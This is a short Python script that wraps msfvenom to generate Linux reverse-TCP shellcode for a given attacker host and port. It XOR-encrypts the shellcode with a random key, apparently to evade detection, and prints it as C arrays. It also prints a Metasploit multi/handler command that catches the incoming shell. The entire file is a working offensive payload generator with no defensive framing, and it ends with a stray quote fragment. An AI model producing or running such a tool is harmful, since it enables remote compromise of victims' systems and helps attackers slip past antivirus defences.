#!/usr/bin/env python3
import subprocess, random, re, sys, tempfile, os

def generate(lhost, lport, payload="linux/x64/shell_reverse_tcp"):
    KEY = random.randbytes(8)
    
    with tempfile.NamedTemporaryFile(mode='w+', suffix='.c', delete=False) as tmp:
        tmp_path = tmp.name
    

    cmd = f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f c -o {tmp_path}'
    subprocess.run(cmd, shell=True, check=True, capture_output=True)
    

    with open(tmp_path, 'r') as f:
        content = f.read()

        b = bytes([int(x, 16) for x in re.findall(r'\\x([0-9a-f]{2})', content)])
    
    os.unlink(tmp_path)
    

    enc = bytes([b[i] ^ KEY[i % len(KEY)] for i in range(len(b))])
    
    print("// === PAYLOAD ===")
    print(f'unsigned char encrypted[] = "{''.join(f'\\x{b:02x}' for b in enc)}";')
    print(f'unsigned char key[] = "{''.join(f'\\x{b:02x}' for b in KEY)}";')
    print(f'unsigned int encrypted_len = sizeof(encrypted) - 1;')
    print(f'unsigned int key_len = sizeof(key) - 1;')
    print("// === END PAYLOAD ===\n")
    
    print(f'msfconsole -q -x "use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run"')
    
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 generate.py <LHOST> <LPORT> [PAYLOAD]")
        print("Example: python3 generate.py 192.168.1.100 4444 linux/x64/shell_reverse_tcp")
        sys.exit(1)
    
    lhost = sys.argv[1]
    lport = sys.argv[2]
    payload = sys.argv[3] if len(sys.argv) > 3 else "linux/x64/shell_reverse_tcp"
    generate(lhost, lport, payload)'' 
